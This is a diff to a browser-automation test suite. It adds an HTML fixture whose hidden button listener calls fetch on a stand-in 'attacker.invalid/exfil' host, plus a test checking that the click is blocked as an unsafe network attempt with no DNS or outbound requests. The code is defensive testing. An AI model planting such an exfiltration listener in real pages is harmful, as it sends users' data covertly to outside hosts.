@@ -89,6 +89,16 @@ INPUT_BUTTON_FIXTURE = b"""<!doctype html>
 </form>
 <script>document.getElementById("input-offline").addEventListener("click",()=>{const revealed=document.createElement("input");revealed.name="revealed_step";document.body.append(revealed)});</script>
 </body></html>"""
+INPUT_BUTTON_NETWORK_FIXTURE = b"""<!doctype html>
+<html><head><title>Input Button Network Fixture</title></head>
+<body><form>
+<input type="button" id="input-network" value="Continue">
+<button type="submit" id="submit-final">Submit Application</button>
+</form>
+<script>
+document.getElementById("input-network").addEventListener("click",()=>{fetch("https://attacker.invalid/exfil").catch(()=>{})});
+</script>
+</body></html>"""
 INPUT_BUTTON_FINAL_LIKE_FIXTURE = b"""<!doctype html>
 <html><head><title>Input Button Final Like Fixture</title></head>
 <body><form>
@@ -195,6 +205,7 @@ class FixtureHandler(http.server.SimpleHTTPRequestHandler):
             else CROSS_JOB_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-cross-job")
             else FINAL_LIKE_CONTINUATION_FIXTURE if self.path.startswith("/continue-native-final")
             else SUBMIT_CONTINUATION_FIXTURE if self.path.startswith("/continue-native")
+            else INPUT_BUTTON_NETWORK_FIXTURE if self.path.startswith("/input-button-network")
             else INPUT_BUTTON_FINAL_LIKE_FIXTURE if self.path.startswith("/input-button-final")
             else INPUT_BUTTON_FIXTURE if self.path.startswith("/input-button")
             else CLEAN_FIXTURE if self.path.startswith("/clean") else FIXTURE.read_bytes()
@@ -845,6 +856,38 @@ def test_input_type_button_final_like_value_is_denied_and_kept_zero(fixture_serv
         assert counters["terminal_reason"] is None
         assert FixtureHandler.final_like_requests == 0
         assert FixtureHandler.attacker_http_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_input_type_button_hostile_listener_remains_terminal_and_offline(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/input-button-network")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-input-button-network",
+        run_id=7,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        continuation = next(
+            button
+            for button in observation["buttons"]
+            if button["element_kind"] == "input" and button["button_type"] == "button"
+        )
+        before = session.network_counters()
+        with pytest.raises(BrowserAdapterError, match="unsafe_network_attempt"):
+            session.click_offline(continuation["target_id"])
+        counters = session.network_counters()
+        assert counters["terminal_reason"] == "unsafe_network_attempt"
+        assert counters["upstreamConnectAttempts"] == before["upstreamConnectAttempts"]
+        assert counters["dnsLookups"] == before["dnsLookups"]
+        assert counters["attackerDnsLookups"] == before["attackerDnsLookups"]
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
 
 
 
